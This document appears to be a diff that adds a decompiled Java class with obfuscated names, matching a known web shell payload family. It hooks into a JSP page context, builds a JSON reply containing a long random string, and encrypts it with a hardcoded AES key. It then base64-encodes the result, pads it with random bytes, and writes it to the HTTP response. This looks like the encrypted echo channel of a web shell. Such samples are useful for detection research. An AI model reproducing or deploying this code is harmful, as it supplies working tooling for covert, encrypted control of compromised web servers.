@@ -1,0 +1,186 @@
+/*
+ * Decompiled with CFR.
+ */
+package com.oxvp.ildgj.vbxvczk;
+
+import java.io.ByteArrayOutputStream;
+import java.lang.Class;
+import java.lang.Exception;
+import java.lang.Integer;
+import java.lang.Object;
+import java.lang.String;
+import java.lang.StringBuilder;
+import java.lang.System;
+import java.lang.Throwable;
+import java.lang.reflect.Method;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Random;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+
+/*
+ * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
+ */
+public class Hvnkvkqvca {
+    public static String content;
+    public static String payloadBody;
+    private Object Request;
+    private Object Response;
+    private Object Session;
+
+    public Hvnkvkqvca() {
+        content = "";
+        content = content + "HpXrVNKajFYY0O4vbnRxgFseVWMHgEpo2wsYzSiD7vy2epj8nVrT8AgezyxbAOCmZfT4zD5U3b5sg7xjTHHJRSlWY1b2b27opwpq3CxDKRfjG3kcd1oswUqm6b7yjtQMyXAc1Ywwl57RTZkuhkHkEnSCgOPrBkpSoeaCEt84s1JXy7sjEXexRguYoE74GTeYK6wDdCp8TxKUNuVPEu4BMObWcB3OZIcJ8gzOBtfg9j6EVMR61qYeAIdczfBvK8HNhc1TsB6U6cst77NCQYv0sGRR3sOcocvdFRX8BXvve6z2DITb78ioPNhZCAQUsHASA5uoBmOn9kLIGUMn4zmdzxTEmmAx7NUf8m7amFPAzO5JlakfxTkRMHZIEMRbTLq7TIT4FZ3nB4CbDTWWdUWWBtLcRrBlYZM5igpB1xiPwDtVUIHfoasvVYQf8ThkUKgr56t4qYg0TXZwoCpX2t4BFGSHhDo07wqf5h01l7necPDXR4UHuzBN2jL5JJrr4m4I4HTLB6zYBwUiKjJbQ2VFKC9xRvv2UbRDuGJgwRoQgScjbT0Gq8HpODc17FJoDsjcsIjcZtU8gDyXqPnyp12ypWXkLnkQoikX2SLDRe8xyxhNohsz9VjnlkKy7XewVC4Y42Wr30gilwDgA4jc0uJQyefiNxwqrZFgQlTCaf2Nh8lWRiobFcw8jWQk8btD3wWAn3XpI2ogsr5JTUfDU3xvqq3UC1jGO6e0DIRXVfa2ktLMhFdw5mm3XTPPOVDgH2PiwYj2ecB7Ci2AyMCCQlby8XSKSfpDMZW1teSs2SJUWtdHwSE9MtWcNCitUNQ399cd0m1iyuOIsTQFOYhD2lqL0RTAHfMaPPt0XdFLGpU3rspBDrxp13pe1SrIrALNKlmKrQP2TMPJzXCSA61kbqHYyeQHCWYNA8Y7K1ANsaGYmycu9svpELEGHhXE8Iv7xitxI4Ewni7jjQOGuKTwWekkwVAzwLCW8oJWc9OGLn7eQhS3GrpGWPOmJd3E83AYYD0q8YXy1IpHDeeXNk20t4CN7vIOUp65oakvkDgYq5EN9vIyDeeLchjbGJBoJKsTa4ov6iKNg3WFAeZZ4hAinsM7MwnYr4wFXcQQTB93EqaSuvI9jud6QPW2Y5Q8Ct146LY1Zi6d6hKfpsbOHr1GJVgSPJylLBXHXUosYesI7gsIdxCd9Zeruxu0n717k2m3rSfPZM8W8IcVBOqRNQnAA1nQB5f7pgW8pc7jAK39jMXO8hj6oDm3FkfWEfsnRN86bvdvCjEgqbVNC4CExtz9nH2zNqnBgsaZEp2XzSn8bvJhZRa2FjMCn260vqMEwWzKTMVF7FJVWQLgf1nVswD67OXc0Pt6TPqe4rpWQtredJvBp22lglU8gvuUWoxK8sky04KqqK3DOReA1FgU1LAHcZLBC11pxDTq2olrSkMHhRvzXqaPbVF3zaeMrvRPsLeUqMccajITgS2hSKzZOgveYyJIM1yoSiF1b8t0dl4hbeAkwnwBWVdN9lLXUgwmRjsCq5EFTqcZCTU5by1lodCsc1A8PaDMxkbCWra1yQqmh4STPEjNc0OvzMzwwBeV5BI5H5J3HRDfvuJJ51gc0fQxastVMivnBgEFc2HNUhDqoQlUjLKXPKMRG9RjV2bAzjZdO5wI7UnCs6NBDMT30GC1AroNf4pia8SmhjUm20ZCUJLikg8mep0npaseBrEgKVosIluT2jBwxOrTQTq6UgFgZ2CnnTTLDYWFaKTi1qSI6i0Odn8KQvxQGCcwNCgzMjbWBK9y1vwFtZSPwB5lE8yZw8KLpDkKRERI6c7XpnkiYDp292ih10s4IP2FfB7HkD9302yT36qxRJh";
+    }
+
+    /*
+     * WARNING - Removed try catching itself - possible behaviour change.
+     * Loose catch block
+     */
+    public boolean equals(Object obj) {
+        block10: {
+            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
+            this.fillContext(obj);
+            result.put("status", "success");
+            result.put("msg", content);
+            try {
+                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                Method write = so.getClass().getMethod("write", byte[].class);
+                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+            }
+            catch (Exception e) {
+                e.printStackTrace();
+            }
+            break block10;
+            catch (Exception e) {
+                try {
+                    result.put("msg", e.getMessage());
+                    result.put("status", "success");
+                }
+                catch (Throwable throwable) {
+                    try {
+                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                        Method write = so.getClass().getMethod("write", byte[].class);
+                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                    }
+                    catch (Exception e2) {
+                        e2.printStackTrace();
+                    }
+                    throw throwable;
+                }
+                try {
+                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+                    Method write = so.getClass().getMethod("write", byte[].class);
+                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
+                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                }
+                catch (Exception e3) {
+                    e3.printStackTrace();
+                }
+            }
+        }
+        return true;
+    }
+
+    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        String version = System.getProperty("java.version");
+        sb.append("{");
+        for (String key : entity.keySet()) {
+            sb.append("\"" + key + "\":\"");
+            String value = entity.get(key);
+            if (encode) {
+                value = this.base64encode(value.getBytes());
+            }
+            sb.append(value);
+            sb.append("\",");
+        }
+        if (sb.toString().endsWith(",")) {
+            sb.setLength(sb.length() - 1);
+        }
+        sb.append("}");
+        return sb.toString();
+    }
+
+    private void fillContext(Object obj) throws Exception {
+        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
+            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
+            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
+        } else {
+            Map objMap = (Map)obj;
+            this.Session = objMap.get("session");
+            this.Response = objMap.get("response");
+            this.Request = objMap.get("request");
+        }
+        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+    }
+
+    private String base64encode(byte[] data) throws Exception {
+        String result = "";
+        String version = System.getProperty("java.version");
+        try {
+            this.getClass();
+            Class<?> Base64 = Class.forName("java.util.Base64");
+            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
+        }
+        catch (Throwable error) {
+            this.getClass();
+            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object Encoder = Base64.newInstance();
+            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
+            result = result.replace("\n", "").replace("\r", "");
+        }
+        return result;
+    }
+
+    private byte[] getMagic() throws Exception {
+        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+        Random random = new Random();
+        byte[] buf = new byte[magicNum];
+        for (int i = 0; i < buf.length; ++i) {
+            buf[i] = (byte)random.nextInt(256);
+        }
+        return buf;
+    }
+
+    private byte[] Encrypt(byte[] byArray) throws Exception {
+        Class<?> clazz;
+        String string = "e45e329feb5d925b";
+        byte[] byArray2 = string.getBytes("utf-8");
+        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(1, secretKeySpec);
+        byte[] byArray3 = cipher.doFinal(byArray);
+        try {
+            clazz = Class.forName("java.util.Base64");
+            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
+            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
+        }
+        catch (Throwable throwable) {
+            clazz = Class.forName("sun.misc.BASE64Encoder");
+            Object obj = clazz.newInstance();
+            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
+            string2 = string2.replace("\n", "").replace("\r", "");
+            byArray3 = string2.getBytes();
+        }
+        int n = Integer.parseInt(string.substring(0, 2), 16) % 16;
+        Random random = new Random();
+        byte[] byArray4 = new byte[n];
+        for (int i = 0; i < byArray4.length; ++i) {
+            byArray4[i] = (byte)random.nextInt(256);
+        }
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        byteArrayOutputStream.write(byArray3);
+        byteArrayOutputStream.write(byArray4);
+        return byteArrayOutputStream.toByteArray();
+    }
+}
